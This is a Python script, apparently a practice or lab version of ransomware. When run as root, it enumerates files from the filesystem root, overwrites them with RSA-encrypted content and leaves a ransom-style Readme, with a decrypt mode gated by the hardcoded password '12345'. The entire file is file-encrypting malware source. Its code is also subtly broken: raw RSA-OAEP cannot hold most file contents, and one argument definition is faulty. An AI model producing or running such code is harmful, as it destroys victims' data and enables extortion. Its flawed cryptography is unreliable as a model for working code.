import os
import sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
import argparse
self = sys.argv[0]
passKey = "12345"
dirIgnoreList = ['/bin', '/boot', '/dev', '/etc', '/lib', '/proc', '/run', '/sbin', '/sys', '/usr/lib', '/usr/lib64', '/usr/libexec']
excludedFiles = [self, '/public_key.pem', '/private_key.pem', '/Readme.txt']
origin = "/"
def encrypt():
    print("[#] Starting file enumeration from " + origin)
    fileList = findFiles(origin)
    print("[#] File enumeration complete, found " + str(len(fileList)) + " files")
    print("[#] Generating RSA keys")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    public_key = private_key.public_key()
    print("[#] Key generation complete, writing files")
    pubFile = open("/public_key.pem", "wb")
    pubFile.write(public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ))
    pubFile.close()
    privFile = open("/private_key.pem", "wb")
    privFile.write(private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.BestAvailableEncryption(passKey.encode())
    ))
    privFile.close()
    print("[#] Key files written, encrypting files")
    for f in fileList:
        try:
            with open(f, "rb") as file:
                plaintext = file.read()
            ciphertext = public_key.encrypt(
                plaintext,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            with open(f, "wb") as file:
                file.write(ciphertext)
            print("[#] Encrypted " + f)
        except Exception as e:
            print("[X] Failed to encrypt " + f + ": " + str(e))
    print("[#] Encryption complete. Writing Readme.txt")
    readme = open("/Readme.txt", "w")
    readme.write("Your files have been encrypted. To decrypt them, you will need the private key and the password.\n")
    readme.close()
    print("[#] Readme.txt written.")
def decrypt():
    print("[#] Reading private key file")
    try:
        with open("/private_key.pem", "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=passKey.encode(),
            )
    except Exception as e:
        print("[X] Failed to read private key file: " + str(e))
        return
    print("[#] Private key file read, starting decryption")
    fileList = findFiles(origin)
    print("[#] File enumeration complete, found " + str(len(fileList)) + " files")
    for f in fileList:
        try:
            with open(f, "rb") as file:
                ciphertext = file.read()
            plaintext = private_key.decrypt(
                ciphertext,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            with open(f, "wb") as file:
                file.write(plaintext)
            print("[#] Decrypted " + f)
        except Exception as e:
            print("[X] Failed to decrypt " + f + ": " + str(e))
    print("[#] Decryption complete.")
def findFiles(origin):
    ignore_dirs = set(_norm_path(p) for p in dirIgnoreList)
    exclude_files = set(_norm_path(p) for p in excludedFiles)

    start_real = _norm_path(origin)
    results = []
    for root, dirs, files in os.walk(start_real, topdown=True, followlinks=False):
        root_real = _norm_path(root)

        pruned = []
        for d in dirs:
            full = _norm_path(os.path.join(root_real, d))
            if full in ignore_dirs:
                continue
            pruned.append(d)
        dirs[:] = pruned

        for fname in files:
            fpath_real = _norm_path(os.path.join(root_real, fname))
            if fpath_real in exclude_files:
                continue
            results.append(fpath_real)

    return results
def _norm_path(p):
        try:
            return os.path.realpath(os.path.abspath(p))
        except Exception:
            return os.path.abspath(p)
def checkPass(userPass):
    if(userPass == passKey):
        return True
    else:
        return False
if(os.getuid() == 0):
    parser = argparse.ArgumentParser(description="Basic CLI for encrypt/decrypt")
    parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt files')
    parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt files')
    parser.add_argument('-o', '--origin', dest=origin, default=origin, type=str, required=False, help="Root path to start enumeration, defaults to '/'")
    parser.add_argument('-p', '--passkey', dest='password', default='', type=str, required=True, help='Password used for user authentication') # MODIFY
    args = parser.parse_args(sys.argv[1:])

    origin = args.origin
    password = args.password

    if args.encrypt and args.decrypt:
        print("[X] Cannot specify both --encrypt and --decrypt")
    else:
        if not checkPass(password):
            print("[X] Invalid password.")
            sys.exit(1)
        if args.encrypt:
            encrypt()
        elif args.decrypt:
            decrypt()
